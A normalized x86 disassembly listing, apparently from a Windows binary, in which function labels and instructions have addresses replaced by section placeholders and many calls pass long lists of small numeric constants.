mov eax [ eax + 0x4 ]
mov [ ecx + 0x20 ] eax
retn
sub_1006dc90
push esi
push edi
mov edi eax
mov esi [ edi + 0xc ]
call sub_1006db30
cmp [ esi + 0xc ] 0x0
jbe r-xdata
lea edx [ esi + 0x8 ]
push edx
push edi
call sub_10025650
add esp 0x8
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov edi [ eax ]
cmp edi 0x1
jne r-xdata
pop edi
pop esi
retn
mov ecx [ ecx + 0x1c ]
push ecx
call sub_10045960
push eax
push r--data
call sub_1003bee0
add esp 0xc
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
xor edx edx
mov ecx [ eax + 0x1c ]
cmp ecx 0xa
jne r-xdata
test edx edx
jne r-xdata
cmp edi 0x1
jne r-xdata
test ecx ecx
jne r-xdata
cmp [ esi + 0x6c ] 0x0
jne r-xdata
pop edi
pop esi
retn
or [ eax + 0xc ] 0x2
jmp r-xdata
mov edi [ eax + 0x1c ]
cmp edi [ ecx + 0x18 ]
je r-xdata
cmp [ esi + 0x70 ] ecx
je r-xdata
mov edx 0x1
jmp r-xdata
mov ecx [ esi + 0x68 ]
mov edx [ ecx + 0x4 ]
mov [ eax + 0x40 ] edx
mov edx [ ecx + 0x8 ]
mov [ eax + 0x44 ] edx
mov edx [ ecx + 0xc ]
mov [ eax + 0x48 ] edx
cmp [ ecx ] 0x2
jne r-xdata
test edx edx
jne r-xdata
mov ecx [ esi + 0x68 ]
cmp [ ecx ] 0x2
jne r-xdata
mov ecx r--data
mov edx [ ecx ]
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
mov [ eax + 0x30 ] ecx
mov edx [ ecx + 0x10 ]
add ecx 0x10
mov [ eax + 0x2c ] edx
mov ecx [ ecx + 0x4 ]
pop edi
mov [ eax + 0x30 ] ecx
pop esi
retn
sub_1006dd70
push edi
mov edi eax
call sub_1006db30
push 0x58
push edi
call sub_10020380
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
mov [ eax ] 0x4
mov ecx [ esi + 0x18 ]
mov [ eax + 0x10 ] ecx
mov edx [ esi + 0x10 ]
mov [ eax + 0x14 ] edx
mov ecx [ esi + 0x14 ]
mov [ eax + 0x18 ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x1c ] edx
mov edx [ esi + 0x8 ]
mov [ eax + 0x20 ] edx
mov ecx [ esi + 0xc ]
mov [ eax + 0x24 ] ecx
add esp 0x8
lea ecx [ ebx + 0x10 ]
push ecx
mov [ eax + 0x4 ] ebx
mov edx [ ecx + 0x4 ]
push eax
push edi
mov [ eax + 0x8 ] edx
call sub_100049a0
add esp 0xc
pop edi
retn
sub_1006dde0
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_1006dc90
push 0x96
push 0x66
push 0x0
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x10
test eax eax
je r-xdata
sub_1006de30
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x10
test eax eax
jne r-xdata
retn
lea ecx [ ecx ]
mov eax esi
call sub_1006dc90
push 0x96
push 0x5f
push 0x0
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x10
test eax eax
je r-xdata
sub_1006de80
push ebp
mov ebp esp
push esi
push edi
push 0x58
push ebx
call sub_10020380
mov edi eax
lea esi [ edi + 0x10 ]
push esi
xor eax eax
push 0x1
push ebx
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0xffffffff
mov [ edi ] 0x1
mov [ edi + 0xc ] eax
call sub_100268a0
lea eax [ esi + 0x3c ]
push eax
push 0x0
push ebx
call sub_100268a0
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] 0x0
mov edx [ r--data ]
mov [ esi + 0x14 ] edx
mov eax [ r--data ]
mov [ esi + 0x18 ] eax
mov ecx [ r--data ]
mov [ esi + 0x1c ] ecx
mov edx [ r--data ]
mov [ esi + 0x20 ] edx
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x4 ]
mov [ esi + 0x24 ] ecx
mov edx [ eax + 0x8 ]
mov [ esi + 0x28 ] edx
mov eax [ eax + 0xc ]
mov [ esi + 0x2c ] eax
mov ecx [ r--data ]
mov [ esi + 0x30 ] ecx
mov edx [ r--data ]
mov [ esi + 0x34 ] edx
mov eax [ r--data ]
add esp 0x20
mov [ esi + 0x38 ] eax
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_1006df30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
push esi
push 0x58
push eax
call sub_10020380
mov ecx [ ebp + 0x8 ]
mov ebx eax
lea esi [ ebx + 0x10 ]
push esi
xor eax eax
push 0x1
push ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0x8 ] 0xffffffff
mov [ ebx ] 0x1
mov [ ebx + 0xc ] eax
call sub_100268a0
mov edx [ edi + 0x1c ]
mov [ esi + 0x3c ] edx
mov eax [ edi + 0x20 ]
mov [ esi + 0x40 ] eax
mov ecx [ edi + 0x24 ]
mov eax [ ebp + 0xc ]
mov [ esi + 0x44 ] ecx
mov edx [ edi + 0x18 ]
mov [ esi + 0x10 ] eax
mov [ esi + 0xc ] edx
mov ecx [ edi + 0x10 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0x14 ]
mov [ esi + 0x18 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x24 ] eax
mov ecx [ edi + 0x8 ]
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x2c ] edx
mov eax [ r--data ]
mov [ esi + 0x1c ] eax
mov ecx [ r--data ]
mov [ esi + 0x20 ] ecx
mov edx [ r--data ]
mov [ esi + 0x30 ] edx
mov eax [ r--data ]
mov [ esi + 0x34 ] eax
mov ecx [ r--data ]
mov [ esi + 0x38 ] ecx
mov edx [ r--data ]
mov [ edi + 0x1c ] edx
mov eax [ r--data ]
add esp 0x14
mov [ edi + 0x20 ] eax
mov ecx [ r--data ]
pop esi
mov eax ebx
mov [ edi + 0x24 ] ecx
pop ebx
pop ebp
retn
sub_1006dff0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi [ edi + 0xc ]
mov ebx eax
jne r-xdata
cmp [ esi + 0x44 ] 0x0
je r-xdata
call sub_1006db30
mov eax [ edi + 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
mov eax [ eax ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push ecx
call sub_1006d8f0
add esp 0x1c
test eax eax
je r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ edx + ecx * 4 - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
push edi
call sub_1006da20
add esi 0x8
push esi
push ebx
push edi
call sub_100049a0
add esp 0x10
pop edi
pop esi
pop ebx
pop ebp
retn
lea ecx [ eax + 0x10 ]
push ecx
mov [ ebx + 0x4 ] eax
mov eax [ ecx + 0x4 ]
push ebx
push edi
mov [ ebx + 0x8 ] eax
call sub_100049a0
add esi 0x8
push esi
push ebx
push edi
call sub_100049a0
add esp 0x18
pop edi
pop esi
pop ebx
pop ebp
retn
sub_1006e0a0
push esi
push 0x0
push ebx
call sub_1006df30
push 0x0
mov ecx ebx
mov esi eax
call sub_1006dff0
mov eax [ esi + 0x1c ]
add esp 0xc
push esi
push eax
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
add esp 0xc
mov eax esi
pop esi
retn
sub_1006e0e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov ebx ecx
push eax
call sub_1006de80
mov esi eax
or edi 0x1
or [ esi + 0xc ] edi
push 0x0
mov ecx ebx
call sub_1006dff0
mov ecx [ ebp + 0x8 ]
add esp 0x8
push esi
push ecx
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
add esp 0xc
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
sub_1006e130
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi eax
mov eax [ ebp + 0x8 ]
push esi
push eax
mov edi ebx
call sub_1006df30
mov ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x4 ] eax
call sub_1006dff0
lea edi [ ebx + 0x1c ]
push r--data
push edi
call sub_1005a810
add esp 0x14
test eax eax
je r-xdata
push r--data
push edi
call sub_1005a810
add esp 0x8
test eax eax
je r-xdata
mov esi [ esi * 4 + rw-data ]
push r--data
push edi
call sub_1005a810
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push r--data
push edi
call sub_1005a810
add esp 0x8
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_1006d7e0
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax esi
mov edx [ ebp + 0x8 ]
push edx
mov eax ebx
call sub_1006d7e0
add esp 0x4
mov ecx [ eax + 0x10 ]
mov eax r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
xor ecx ecx
test eax eax
sete cl
mov eax ecx
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_1006e240
push esi
mov esi [ eax + 0xc ]
add esi 0x48
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ edi + 0x18 ]
push esi
push ecx
push eax
call sub_10016b30
add esp 0xc
cmp [ edi ] 0x5
jne r-xdata
mov ecx [ edi + 0x10 ]
mov [ esi + 0xc ] ecx
mov edx [ edi + 0x4 ]
mov [ esi + 0x10 ] edx
mov ecx [ edi + 0x8 ]
mov [ esi + 0x14 ] ecx
mov edx [ edi + 0xc ]
mov [ esi + 0x18 ] edx
mov edx [ edi + 0x18 ]
push edx
push r--data
call sub_1003bee0
add esp 0x8
pop esi
retn
mov [ esi + 0x1c ] 0x2
sub_1006e2a0
push ebp
mov ebp esp
push edi
push 0x0
push esi
mov edi eax
call sub_1006df30
push 0x0
mov ecx esi
mov edi eax
call sub_1006dff0
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
mov ecx [ ebp + 0x8 ]
push ecx
push esi
call sub_1005cfb0
mov eax [ esi + 0xc ]
mov edx [ eax ]
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xc ]
add esp 0x14
mov [ eax ] 0x7
pop edi
pop ebp
retn
sub_1006e300
push ebp
mov ebp esp
mov ecx [ eax + 0xc ]
mov eax [ ecx + 0x18 ]
dec eax
js r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx + 0x14 ]
lea edx [ ecx + eax * 4 ]
cmp [ ecx ] 0x1
jne r-xdata
sub edx 0x4
dec eax
jns r-xdata
cmp [ ecx + 0x1c ] 0x27
je r-xdata
mov ecx [ edx ]
cmp ecx r--data
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax 0x1
pop ebp
retn
sub_1006e340
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ eax + 0xc ]
mov esi [ edi + 0x18 ]
xor eax eax
dec esi
mov [ ebp - 0x4 ] eax
js r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
push ebx
mov eax [ ebp - 0x4 ]
pop ebx
cmp [ eax ] 0x1
jne r-xdata
dec esi
jns r-xdata
mov edx [ eax + 0x1c ]
mov ecx [ ebp + 0x8 ]
cmp edx [ ecx + 0x1c ]
jne r-xdata
mov ecx [ edi + 0x14 ]
mov eax [ ecx + esi * 4 ]
cmp eax r--data
je r-xdata
mov edx [ eax + 0x20 ]
cmp edx [ ecx + 0x20 ]
jne r-xdata
add ecx 0x4c
push ecx
lea ebx [ eax + 0x4c ]
call sub_1006d460
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
inc [ ebp - 0x4 ]
mov [ eax ] esi
sub_1006e3b0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ edi + 0xc ]
add esi 0x14
cmp ebx r--data
jne r-xdata
push r--data
push r--data
jmp r-xdata
push esi
push ebx
push edi
call sub_100049a0
add esp 0xc
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push edx
push r--data
call sub_1003bee0
mov eax [ ebp - 0x4 ]
push esi
push eax
push edi
call sub_1002ad70
add esp 0x14
call sub_1003bee0
mov eax [ esi + 0x4 ]
add esp 0x4
lea ecx [ ebp - 0x4 ]
push ecx
mov [ ebp - 0x4 ] eax
push ebx
mov eax edi
call sub_1006e340
add esp 0x8
cmp eax 0x3
jl r-xdata
sub_1006e420
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ eax + 0xc ]
push esi
mov esi [ ebx + 0x18 ]
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x14 ]
dec esi
lea ecx [ ecx + esi * 4 ]
push edi
mov edi [ ecx ]
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
pop edi
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
test esi esi
je r-xdata
mov ecx [ ebx + 0x8 ]
lea esp [ esp ]
or esi 0xffffffff
mov edi [ ecx - 0x4 ]
sub ecx 0x4
dec esi
mov [ ebp - 0x4 ] ecx
cmp edi r--data
je r-xdata
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
mov eax [ eax + 0x1c ]
push eax
call sub_10045960
push eax
push esi
push r--data
call sub_1003bee0
add esp 0x10
cmp esi [ ebx + 0x18 ]
jae r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ edx + eax * 4 - 0x4 ]
mov eax [ ebx + 0xc ]
inc esi
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
xor eax eax
test edx edx
je r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
mov ecx [ ebx + 0x14 ]
mov eax [ ecx + esi * 4 ]
mov edx [ ebp + 0x8 ]
push 0x80
push eax
push edx
call sub_1002cbc0
mov ecx [ ebp + 0x8 ]
push 0x1
mov edi eax
call sub_1006dff0
mov eax [ ebx + 0x14 ]
add esp 0x10
mov [ eax + esi * 4 ] edi
mov ecx [ edi + 0x1c ]
push esi
push ecx
call sub_10045960
add esp 0x4
push eax
push r--data
call sub_1003bee0
inc esi
add esp 0xc
cmp esi [ ebx + 0x18 ]
jb r-xdata
mov ecx [ ebx + 0x8 ]
inc eax
add ecx 0x4
cmp eax edx
jb r-xdata
cmp [ ecx ] edi
je r-xdata
mov ecx [ ebp - 0x4 ]
jmp r-xdata
sub_1006e530
push esi
mov esi [ ebx + 0xc ]
push edi
add esi 0x14
xor edi edi
lea ebx [ ebx ]
push edi
push r--data
call sub_1003bee0
add esp 0x8
pop edi
pop esi
retn
cmp eax r--data
jne r-xdata
push esi
push ebx
call sub_10025650
add esp 0x8
inc edi
test eax eax
je r-xdata
sub_1006e570
cmp [ esi + 0xc ] 0x0
push ebx
push edi
jne r-xdata
pop edi
mov eax 0x1
pop ebx
retn
mov eax [ esi ]
mov ecx r--data
sbb eax eax
sbb eax 0xffffffff
test dl dl
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_1006d600
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
mov edi [ esi + 0x4 ]
lea ebx [ eax + 0x1 ]
mov eax r--data
call sub_1006d600
test eax eax
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add ecx 0x2
test dl dl
jne r-xdata
mov edi [ esi + 0x8 ]
mov eax r--data
call sub_1006d600
test eax eax
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_1006d600
test eax eax
je r-xdata
mov edi [ esi + 0x4 ]
xor ebx ebx
mov eax r--data
call sub_1006d600
test eax eax
jne r-xdata
cmp [ esi + 0x14 ] ebx
je r-xdata
pop edi
mov eax 0x2
pop ebx
retn
mov edi [ esi + 0x4 ]
mov eax r--data
call sub_1006d600
test eax eax
je r-xdata
pop edi
xor eax eax
pop ebx
retn
cmp [ esi + 0x14 ] ebx
jne r-xdata
sub_1006e640
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebx + 0xc ]
push edi
lea eax [ ebp - 0x14 ]
push eax
push 0xa
push ebx
call sub_100268a0
mov eax [ ebp + 0x14 ]
add esp 0xc
cmp eax 0x96
je r-xdata
mov edi [ esi + 0xc ]
dec edi
mov [ ebp - 0x8 ] 0x0
js r-xdata
lea edi [ ebp + 0x14 ]
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_10052120
mov eax [ ebp - 0x8 ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0x8 ]
mov ebx [ ebp - 0x10 ]
lea eax [ edx + edi * 4 ]
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x14 ]
push ecx
push eax
push ebx
call sub_100049a0
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub [ ebp - 0x4 ] 0x4
dec edi
jns r-xdata
mov edx [ ebp + 0xc ]
mov esi [ eax + 0x1c ]
mov ecx [ edx + 0x4 ]
xor eax eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
cmp [ eax ] 0x1
jne r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
test ebx ebx
je r-xdata
mov edx [ edx ]
nop
mov ebx [ ebp + 0x8 ]
cmp [ ebp + 0x10 ] ecx
jne r-xdata
mov edx [ ebp - 0x14 ]
cmp [ edx + eax * 4 ] esi
je r-xdata
mov [ ebp - 0x8 ] 0x1
jmp r-xdata
inc eax
add edx 0x4
cmp eax ecx
jb r-xdata
mov [ ebp - 0x8 ] 0x0
mov ecx 0x1
inc eax
cmp eax ebx
jb r-xdata
cmp esi [ edx ]
je r-xdata
jmp r-xdata
sub_1006e720
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006e640
add esp 0x54
mov esp ebp
pop ebp
retn
sub_1006e780
mov eax [ eax + 0xc ]
push esi
mov esi [ eax + 0xc ]
dec esi
push edi
js r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx [ eax + 0x8 ]
lea edi [ ecx + esi * 4 ]
pop edi
mov eax 0x1
pop esi
retn
cmp [ eax ] 0x1
jne r-xdata
sub edi 0x4
dec esi
jns r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push eax
call sub_1006d8f0
add esp 0x4c
test eax eax
jne r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
sub_1006e7f0
push ebp
mov ebp esp
sub esp 0xc
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0xc ]
push eax
push 0x6
push esi
call sub_100268a0
mov eax [ ebp + 0xc ]
add esp 0xc
cmp eax 0x96
je r-xdata
push 0x96
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
push 0x7c
push 0x0
lea edx [ ebp - 0xc ]
push edx
push esi
call sub_1006e640
mov edi eax
lea eax [ ebp - 0xc ]
push eax
push esi
call sub_10052120
add esp 0x5c
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
lea edi [ ebp + 0xc ]
lea ecx [ ebp - 0xc ]
push ecx
push eax
push esi
call sub_100049a0
mov eax [ edi + 0x4 ]
add edi 0x4
add esp 0xc
cmp eax 0x96
jne r-xdata
sub_1006e880
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x1e
push 0x1d
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006e640
add esp 0x5c
mov esp ebp
pop ebp
retn
sub_1006e8e0
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
mov [ ebp - 0x4 ] eax
push 0x7c
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006e640
add esp 0x58
mov esp ebp
pop ebp
retn
sub_1006e940
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
mov [ ebp - 0x4 ] eax
push 0x0
mov eax 0x1
push 0x0
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006e640
add esp 0x18
mov esp ebp
pop ebp
retn
sub_1006e980
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x72
mov [ ebp - 0x4 ] eax
mov eax 0x1
push 0x71
push eax
lea edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4 ]
push eax
mov [ ebp - 0x10 ] ecx
call sub_1006e640
add esp 0x18
mov esp ebp
pop ebp
retn
sub_1006e9c0
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x28
test eax eax
je r-xdata
retn
lea esp [ esp ]
mov eax esi
call sub_1006dc90
push 0x96
push 0x3d
push 0x3e
push 0x19
push 0x71
push 0x72
push 0x1f
push 0x21
push 0x22
mov eax esi
call sub_1006d5e0
push eax
call sub_1006d8f0
add esp 0x28
test eax eax
jne r-xdata
push edi
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
sub_1006ea40
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
push ecx
lea eax [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x5f
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x1
mov [ ebp - 0x8 ] 0x1
call sub_1006e640
add esp 0x18
test eax eax
jne r-xdata
mov eax esi
call sub_1006dc90
cmp [ eax ] 0x1
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ eax + 0x1c ] 0x5f
jne r-xdata
mov eax esi
call sub_1006d670
mov eax 0x1
mov esp ebp
pop ebp
retn
sub_1006eab0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi 0x96
mov ebx eax
mov [ ebp - 0x4 ] 0x1
call sub_1006e9c0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] 0x1
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_1006d7e0
add esp 0x4
mov [ ebp - 0x4 ] 0x0
lea ebx [ ebx ]
cmp [ ecx + 0x1c ] ebx
je r-xdata
mov eax esi
call sub_1006dc90
cmp [ eax ] 0x1
jne r-xdata
cmp [ eax + 0x1c ] ebx
jne r-xdata
mov edi [ esi + 0xc ]
add edi 0x14
xor ebx ebx
lea esp [ esp ]
push ebx
push r--data
call sub_1003bee0
mov ecx [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
add esp 0x8
pop edi
pop esi
mov [ ecx ] 0xd
pop ebx
mov esp ebp
pop ebp
retn
cmp eax r--data
jne r-xdata
push edi
push esi
call sub_10025650
add esp 0x8
inc ebx
test eax eax
je r-xdata
sub_1006eb60
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x5f
push 0x0
lea eax [ ebp - 0x4 ]
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax 0x1
push ecx
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
call sub_1006e640
add esp 0x18
test eax eax
push edi
mov ecx esi
mov eax 0x67
jne r-xdata
call sub_1006eab0
add esp 0x4
mov esp ebp
pop ebp
retn
mov eax 0x68
sub_1006ebe0
mov eax [ ecx + 0x20 ]
sub eax 0x0
je r-xdata
push 0x96
push 0x85
push 0x43
push 0x1e
push 0x66
push 0x2
push 0x64
push 0x68
push 0x65
push 0x73
push 0x67
push 0x63
push 0x5f
push 0x79
push 0x6
push 0x6f
push 0xc
push 0x7
push 0x1b
push 0x88
push 0x4b
push 0x19
push 0x1d
push 0x4a
push 0x8
push 0x82
push 0x87
push 0xd
push 0x5
push 0x7a
push 0x90
push 0x84
push 0x4
push 0x1f
push 0x83
push 0x6d
push 0x47
push 0x48
push 0x0
push 0x1a
push 0x15
push 0x16
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x81
push 0x80
push 0x69
push 0x17
push 0x23
push 0x24
push 0x6a
push 0x49
push 0x21
push 0x20
push 0x26
push 0x7f
push 0x78
push 0x22
push 0x7b
push 0x61
push 0x62
push 0x8e
push 0x60
push 0x6e
push 0x42
push 0xa
push 0x1c
push 0x7e
push 0x8b
push 0x3
push 0xe
push 0xb
push 0x52
push 0x7c
push 0x18
push ecx
call sub_1006d8f0
add esp 0x144
retn
dec eax
je r-xdata
push 0x96
push 0x5e
push 0x5d
push ecx
call sub_1006d8f0
add esp 0x10
retn
dec eax
je r-xdata
push 0x96
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push ecx
call sub_1006d8f0
add esp 0x20
retn
call sub_1001b2a6
sub_1006ed00
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi ecx
mov ebx 0x1
call sub_1006e9c0
mov eax [ esi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
cmp [ ecx ] ebx
jne r-xdata
mov eax [ eax + 0x8 ]
mov ecx [ eax + ecx * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
push esi
call sub_1006d7e0
add esp 0x4
push edi
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
jne r-xdata
cmp [ ecx + 0x1c ] edi
je r-xdata
xor ebx ebx
mov edi edi
mov eax esi
call sub_1006dc90
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
mov eax esi
call sub_1006dc90
push edi
mov eax esi
call sub_1006d5e0
call sub_1006d940
add esp 0x4
test eax eax
je r-xdata
sub_1006ed80
push ebp
mov ebp esp
sub esp 0x10
push 0x96
push 0x6e
push 0x2
push 0x5e
push 0x5d
push 0x5b
push 0x58
push 0x57
push 0x56
push 0x55
push 0x54
push 0x4a
push 0x90
push 0x68
push 0x67
push 0x5f
push 0x0
push 0x60
